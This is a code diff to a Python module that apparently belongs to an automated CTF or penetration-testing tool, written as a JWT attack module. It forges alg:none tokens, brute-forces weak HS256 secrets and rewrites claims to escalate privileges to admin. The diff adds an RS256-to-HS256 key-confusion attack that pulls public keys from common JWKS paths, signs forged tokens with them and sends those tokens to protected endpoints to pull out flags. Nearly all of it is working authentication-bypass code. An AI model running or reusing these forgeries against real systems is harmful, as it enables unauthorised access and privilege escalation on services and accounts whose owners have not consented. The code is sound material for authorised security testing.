@@ -1,16 +1,17 @@
 """
 JWT vulnerability attack module.
 Covers: alg:none bypass, empty secret, weak HS256 secret brute-force,
-        privilege escalation via claim manipulation.
-No external dependencies — uses stdlib base64/hmac/hashlib only.
+        privilege escalation via claim manipulation, RS256→HS256 confusion.
 """
 from __future__ import annotations
+import asyncio
 import base64
 import hashlib
 import hmac as _hmac
 import json
+from urllib.parse import urlparse
 
-from attacks.base import BaseAttack
+from attacks.base import BaseAttack, SessionExpiredError
 from engine.flag_hunter import extract_interesting_data, has_definite_flag
 from rich.console import Console
 
@@ -39,6 +40,18 @@ ESCALATION_CLAIMS: dict[str, object] = {
     "sub":      "admin",
 }
 
+_ASYMMETRIC_ALGS = {"RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"}
+
+JWKS_PATHS = [
+    "/.well-known/jwks.json",
+    "/jwks.json",
+    "/api/auth/jwks",
+    "/oauth/jwks",
+    "/api/jwks",
+    "/auth/certs",
+    "/.well-known/openid-configuration",
+]
+
 
 # ── Base64URL helpers ─────────────────────────────────────────────────────────
 
@@ -66,7 +79,6 @@ def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
 
 
 def _forge_none_alg(token: str) -> list[str]:
-    """Return 3 forged tokens with alg=none/None/NONE and empty signature."""
     parsed = _parse_jwt(token)
     if not parsed:
         return []
@@ -83,7 +95,7 @@ def _forge_none_alg(token: str) -> list[str]:
 
 def _forge_hs256(
     token: str,
-    secret: str,
+    secret: str | bytes,
     extra_claims: dict | None = None,
 ) -> str | None:
     parsed = _parse_jwt(token)
@@ -98,12 +110,12 @@ def _forge_hs256(
     enc_h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
     enc_p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
     signing_input = f"{enc_h}.{enc_p}".encode()
-    sig = _hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
+    key = secret if isinstance(secret, bytes) else secret.encode()
+    sig = _hmac.new(key, signing_input, hashlib.sha256).digest()
     return f"{enc_h}.{enc_p}.{_b64url_encode(sig)}"
 
 
 def _verify_secret(token: str, secret: str) -> bool:
-    """Check if `secret` is the signing key — no HTTP request, pure CPU."""
     parsed = _parse_jwt(token)
     if not parsed:
         return False
@@ -118,12 +130,33 @@ def _verify_secret(token: str, secret: str) -> bool:
 
 
 def _build_escalation_claims(payload: dict) -> dict | None:
-    """Return only the claims present in the token that can be escalated."""
     changes = {}
     for key, escalated_value in ESCALATION_CLAIMS.items():
         if key in payload and payload[key] != escalated_value:
             changes[key] = escalated_value
     return changes or None
+
+
+def _jwk_to_pem(jwk: dict) -> bytes | None:
+    try:
+        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+        from cryptography.hazmat.primitives import serialization
+
+        def _decode_int(s: str) -> int:
+            pad = len(s) % 4
+            if pad:
+                s += "=" * (4 - pad)
+            return int.from_bytes(base64.urlsafe_b64decode(s), "big")
+
+        n = _decode_int(jwk["n"])
+        e = _decode_int(jwk["e"])
+        pub = RSAPublicNumbers(e, n).public_key()
+        return pub.public_bytes(
+            serialization.Encoding.PEM,
+            serialization.PublicFormat.SubjectPublicKeyInfo,
+        )
+    except Exception:
+        return None
 
 
 # ── Attack class ──────────────────────────────────────────────────────────────
@@ -137,7 +170,6 @@ class JWTAttack(BaseAttack):
         token: str,
         cookie_name: str | None = None,
     ) -> object:
-        """Send GET with forged JWT in Authorization header (and optionally cookie)."""
         headers = {"Authorization": f"Bearer {token}"}
         cookies: dict[str, str] = {}
         if cookie_name:
@@ -146,6 +178,8 @@ class JWTAttack(BaseAttack):
             return await self.session.request(
                 "GET", url, headers=headers, cookies=cookies, timeout=5.0
             )
+        except SessionExpiredError:
+            raise
         except Exception:
             return None
 
@@ -155,12 +189,6 @@ class JWTAttack(BaseAttack):
         valid_jwt: str,
         cookie_name: str | None,
     ) -> tuple[str, int] | None:
-        """
-        Return (url, valid_status) for the first URL where:
-          - valid JWT → 200
-          - INVALID token → 401 or 403
-        Returns None if no URL enforces auth.
-        """
         for test_url in urls:
             # Skip non-API paths (Angular hash routes, etc.)
             if "/#/" in test_url or test_url.rstrip("/") == test_url.split("//", 1)[-1].split("/")[0]:
@@ -173,15 +201,45 @@ class JWTAttack(BaseAttack):
             )
             if not invalid_resp:
                 continue
-            # Check 1: classic 401/403
             if invalid_resp.status_code in (401, 403):
                 return test_url, valid_resp.status_code
-            # Check 2: both 200 but body size differs significantly (Juice Shop pattern)
             if invalid_resp.status_code == 200:
                 v_len = len(valid_resp.content)
                 i_len = len(invalid_resp.content)
                 if v_len > 0 and abs(v_len - i_len) >= max(20, int(v_len * 0.20)):
                     return test_url, valid_resp.status_code
+        return None
+
+    async def _fetch_public_key(self, base_url: str) -> bytes | None:
+        async def _try(path: str):
+            try:
+                r = await self.session.get(base_url + path, timeout=3.0)
+                if r and r.status_code == 200:
+                    return r.json()
+            except Exception:
+                return None
+
+        results = await asyncio.gather(*[_try(p) for p in JWKS_PATHS])
+
+        for data in results:
+            if not data:
+                continue
+
+            # openid-configuration → follow jwks_uri (one extra request, 3s timeout)
+            if "jwks_uri" in data:
+                try:
+                    r2 = await self.session.get(data["jwks_uri"], timeout=3.0)
+                    data = r2.json() if r2 and r2.status_code == 200 else {}
+                except Exception:
+                    continue
+
+            keys = data.get("keys", [])
+            for k in keys:
+                if k.get("kty") == "RSA" and "n" in k and "e" in k:
+                    pem = _jwk_to_pem(k)
+                    if pem:
+                        return pem
+
         return None
 
     async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
@@ -246,16 +304,13 @@ class JWTAttack(BaseAttack):
                     console.print(
                         f"  [bold red][JWT][/bold red] Zayıf secret bulundu: {secret!r}"
                     )
-                    # Confirm with network request
                     reforged = _forge_hs256(jwt_value, secret)
                     if reforged:
                         resp = await self._request_with_token(protected_url, reforged, cookie_name)
                         if resp and resp.status_code == 200:
                             all_findings.append({
                                 "type": "jwt_weak_secret",
-                                "value": (
-                                    f"JWT weak secret {secret!r} @ {protected_url}"
-                                ),
+                                "value": f"JWT weak secret {secret!r} @ {protected_url}",
                                 "confidence": 0.9,
                             })
                     break
@@ -268,7 +323,6 @@ class JWTAttack(BaseAttack):
                 if working_secret is not None:
                     priv_token = _forge_hs256(jwt_value, working_secret, extra_claims=escalation)
                 else:
-                    # Use alg:none for privilege escalation too
                     escalated_payload = dict(payload)
                     escalated_payload.update(escalation)
                     h = dict(header); h["alg"] = "none"
@@ -304,5 +358,45 @@ class JWTAttack(BaseAttack):
                                 self.stop_event.set()
                         except Exception:
                             pass
+
+        # Step 5: RS256→HS256 confusion (only for asymmetric algorithms)
+        if alg.upper() in _ASYMMETRIC_ALGS and not self._should_stop():
+            parsed_url = urlparse(protected_url)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+            console.print(f"  [dim][JWT] RS256→HS256 confusion deneniyor...[/dim]")
+
+            pem_bytes = await self._fetch_public_key(base_url)
+            if pem_bytes:
+                confusion_token = _forge_hs256(jwt_value, pem_bytes)
+                if confusion_token:
+                    resp = await self._request_with_token(
+                        protected_url, confusion_token, cookie_name
+                    )
+                    if resp and resp.status_code == 200:
+                        console.print(
+                            f"  [bold red][JWT][/bold red] RS256→HS256 confusion! "
+                            f"Public key used as HMAC secret"
+                        )
+                        all_findings.append({
+                            "type": "jwt_rs256_hs256_confusion",
+                            "value": (
+                                f"JWT RS256→HS256 algorithm confusion @ {protected_url} "
+                                f"— public key accepted as HS256 secret"
+                            ),
+                            "confidence": 0.95,
+                        })
+                        try:
+                            findings = extract_interesting_data(resp.text)
+                            flag = has_definite_flag(findings)
+                            if flag:
+                                console.print(f"  [bold green][JWT][/bold green] FLAG: {flag}")
+                                all_findings.extend(
+                                    [f for f in findings if f.get("confidence", 0) >= 1.0]
+                                )
+                                self.stop_event.set()
+                        except Exception:
+                            pass
+            else:
+                console.print(f"  [dim][JWT] JWKS bulunamadı, confusion atlanıyor[/dim]")
 
         return all_findings
